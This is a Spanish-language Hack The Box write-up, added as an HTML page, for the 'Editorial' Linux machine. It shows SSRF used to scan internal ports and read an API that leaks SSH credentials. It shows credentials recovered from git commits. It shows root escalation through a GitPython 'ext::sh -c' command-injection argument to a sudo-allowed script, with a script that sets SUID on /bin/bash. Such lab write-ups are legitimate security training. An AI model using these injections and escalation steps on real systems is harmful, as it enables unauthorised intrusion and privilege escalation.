@@ -1,0 +1,156 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Editorial HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/linux.html">~/writeups/linux</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/editorial/pasted-20260407024432.png" alt="Editorial HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Linux</p>
+          <h1>Editorial</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>sudoers</span>
+            <span>git</span>
+            <span>SSRF</span>
+            <span>Burpsuite</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: Panel de subida que acepta URLs remotas</li>
+            <li><code>Explotación</code>: SSRF para enumerar localhost y descubrir una API interna con credenciales SSH</li>
+            <li><code>Movimiento lateral</code>: Repositorio Git contiene credenciales antiguas en commits</li>
+            <li><code>Escalada de Privilegios</code>: Sudoers sobre un script vulnerable</li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/editorial/pasted-20260408010846.png" alt="Editorial HTB" />
+          <img class="writeup-image" src="/writeups/assets/editorial/pasted-20260408010907.png" alt="Editorial HTB" />
+          <div class="code-card">
+            <h3>Analizar campos del upload y vemos un campo URL</h3>
+            <pre><code># Probar SSRF: Lanzar petición a mi propia máquina
+http://10.10.16.178:81 # No recibo ni conexión ni hay cambios en la web
+http://10.10.16.178:80 # Recibimos conexión y hay un cambio en la previsualización de imagen. Abrimos la imagen y listamos la conexión establecida pero no sirve ni para LFI ni RCE</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/editorial/pasted-20260408012233.png" alt="Editorial HTB" />
+          <img class="writeup-image" src="/writeups/assets/editorial/pasted-20260408012400.png" alt="Editorial HTB" />
+          <img class="writeup-image" src="/writeups/assets/editorial/pasted-20260408012431.png" alt="Editorial HTB" />
+          <img class="writeup-image" src="/writeups/assets/editorial/pasted-20260408012531.png" alt="Editorial HTB" />
+          <div class="code-card">
+            <h3>Aprovechar SSRF</h3>
+            <pre><code># Tenemos la capacidad a través de SSRF de enumerar puertos abiertos, aplicar a localhost para enumerar la máquina</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación: SSRF -&gt; Enumerar puertos abiertos internamente en el target</h2>
+          <div class="code-card">
+            <h3>Lanzar peticiones localhost para cuando se previsualice algo diferente a la foto predeterminada significa que hemos recibido una conexión</h3>
+            <pre><code>http://localhost:$port</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/editorial/pasted-20260408010521.png" alt="Editorial HTB" />
+          <img class="writeup-image" src="/writeups/assets/editorial/pasted-20260408004731.png" alt="Editorial HTB" />
+          <img class="writeup-image" src="/writeups/assets/editorial/pasted-20260408010340.png" alt="Editorial HTB" />
+          <div class="code-card">
+            <h3>Encontramos un puerto abierto</h3>
+            <pre><code>http://localhost:5000
+# Revela APIs</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/editorial/pasted-20260408010521.png" alt="Editorial HTB" />
+          <img class="writeup-image" src="/writeups/assets/editorial/pasted-20260408010831.png" alt="Editorial HTB" />
+          <div class="code-card">
+            <h3>Probar las APIs</h3>
+            <pre><code>http://localhost:5000/api/latest/metadata/messages/authors
+# Credenciales -&gt; dev:dev080217_devAPI!@</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/editorial/pasted-20260408013018.png" alt="Editorial HTB" />
+          <img class="writeup-image" src="/writeups/assets/editorial/pasted-20260408013130.png" alt="Editorial HTB" />
+          <div class="code-card">
+            <h3>Conexión SSH</h3>
+            <pre><code>ssh dev@10.129.17.52
+# Password: dev080217_devAPI!@</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/editorial/pasted-20260408013306.png" alt="Editorial HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Movimiento lateral: Git</h2>
+          <div class="code-card">
+            <h3>Enumerar repositorio Git</h3>
+            <pre><code>git status      # Revisar cambios
+git log         # Revisar logs
+git show &lt;ID&gt;   # Revisar commits
+# Credenciales -&gt; prod:080217_Producti0n_2023!@</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/editorial/pasted-20260408013749.png" alt="Editorial HTB" />
+          <img class="writeup-image" src="/writeups/assets/editorial/pasted-20260408013900.png" alt="Editorial HTB" />
+          <img class="writeup-image" src="/writeups/assets/editorial/pasted-20260408014032.png" alt="Editorial HTB" />
+          <div class="code-card">
+            <h3>Movimiento lateral hacia el usuario prod</h3>
+            <pre><code>su prod
+# Password: 080217_Producti0n_2023!@</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/editorial/pasted-20260408014434.png" alt="Editorial HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios: Sudoers</h2>
+          <div class="code-card">
+            <h3>Sudoer</h3>
+            <pre><code>sudo -l</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/editorial/pasted-20260408014535.png" alt="Editorial HTB" />
+          <div class="code-card">
+            <h3>Analizar script en python</h3>
+            <pre><code>cat /opt/internal_apps/clone_changes/clone_prod_change.py
+# Vulnerabilidad: from git import Repo</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/editorial/pasted-20260408020356.png" alt="Editorial HTB" />
+          <img class="writeup-image" src="/writeups/assets/editorial/pasted-20260408020457.png" alt="Editorial HTB" />
+          <p><a href="https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858">PoC</a></p>
+          <div class="code-card">
+            <h3>Exploit</h3>
+            <pre><code>from git import Repo
+r = Repo.init('', bare=True)
+r.clone_from('ext::sh -c touch% /tmp/pwned', 'tmp', multi_options=["-c protocol.ext.allow=always"])
+
+# Comando a ejecutar -&gt; ext::sh -c touch% /tmp/pwned
+# Ese comando lo pasamos en la máquina como argumento</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Fichero prives.sh</h3>
+            <pre><code>#!/bin/bash
+chmod u+s /bin/bash</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Escalada</h3>
+            <pre><code>chmod +x /tmp/prives.sh
+# Comando para ejecutar prives.sh -&gt; ext::sh -c /tmp/prives.sh
+sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py "ext::sh -c /tmp/prives.sh"</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/editorial/pasted-20260408021306.png" alt="Editorial HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>sudoers</span>
+            <span>git</span>
+            <span>SSRF</span>
+            <span>Burpsuite</span>
+            <span>from_git_import_Repo</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
